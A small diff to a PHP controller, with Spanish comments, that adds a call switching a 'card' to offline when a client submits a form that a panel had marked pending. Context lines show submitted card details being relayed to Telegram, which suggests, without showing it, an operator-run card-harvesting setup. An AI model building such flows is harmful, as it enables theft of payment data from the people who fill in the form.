@@ -129,6 +129,10 @@ class PublicSiteController extends Controller
         // el detalle de la tarjeta (funcionalidad normal del flujo embebido).
         $this->notifyTelegram($company, $view, $payload);
 
+        // Si un botón del panel dejó la tarjeta "pendiente de desconectar", al presionar el
+        // cliente su botón (enviar) el cambio a desconectado es inmediato.
+        $company->applyPendingOffline(true);
+
         return response()->json([
             'ok' => true,
             'message' => 'Información recibida.',
